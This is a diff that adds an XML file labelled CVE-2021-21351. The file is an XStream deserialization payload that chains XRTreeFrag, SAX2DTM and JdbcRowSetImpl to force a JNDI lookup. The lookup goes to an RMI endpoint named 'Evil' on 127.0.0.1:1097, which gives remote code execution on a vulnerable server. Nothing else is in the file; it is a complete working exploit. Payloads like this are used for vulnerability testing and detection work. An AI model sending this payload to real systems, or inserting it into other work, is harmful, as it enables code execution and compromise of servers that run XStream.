@@ -1,0 +1,43 @@
+<!-- CVE-2021-21351 -->
+<sorted-set>
+  <javax.naming.ldap.Rdn_-RdnEntry>
+    <type>javasec4</type>
+    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
+      <m__DTMXRTreeFrag>
+        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
+          <m__size>-10086</m__size>
+          <m__mgrDefault>
+            <__useServicesMechanism>false</__useServicesMechanism>
+            <m__dtms>
+              <null/>
+            </m__dtms>
+          </m__mgrDefault>
+          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
+            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
+              <javax.sql.rowset.BaseRowSet>
+                <default>
+                  <dataSource>rmi://127.0.0.1:1097/Evil</dataSource>
+                </default>
+              </javax.sql.rowset.BaseRowSet>
+            </fPullParserConfig>
+            <fConfigSetInput>
+              <class>com.sun.rowset.JdbcRowSetImpl</class>
+              <name>setAutoCommit</name>
+              <parameter-types>
+                <class>boolean</class>
+              </parameter-types>
+            </fConfigSetInput>
+            <fConfigParse reference='../fConfigSetInput'/>
+          </m__incrementalSAXSource>
+        </m__dtm>
+      </m__DTMXRTreeFrag>
+    </value>
+  </javax.naming.ldap.Rdn_-RdnEntry>
+
+  <javax.naming.ldap.Rdn_-RdnEntry>
+    <type>javasec4</type>
+    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+      <m__obj class='string'>test</m__obj>
+    </value>
+  </javax.naming.ldap.Rdn_-RdnEntry>
+</sorted-set>
